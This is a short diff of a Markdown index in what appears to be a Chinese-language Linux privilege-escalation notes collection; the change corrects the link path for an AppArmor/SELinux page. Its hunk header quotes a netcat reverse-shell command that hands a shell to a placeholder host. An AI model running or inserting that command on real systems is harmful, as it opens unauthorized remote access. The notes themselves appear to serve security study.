@@ -590,7 +590,7 @@ nc -e /bin/sh <host> 4444
 - [UGO](03.pe/UGO.md)
 - [SUID, SGID](03.pe/SUID-SGID-StickyBit.md)
 - [Capabilities](03.pe/Capabilities)
-- [AppArmor, Selinux](03.pe/AppArmor-Selinux)
+- [AppArmor, Selinux](03.pe/AppArmor-SELinux.md)
 - [ACL](03.pe/ACL)
 
 其他
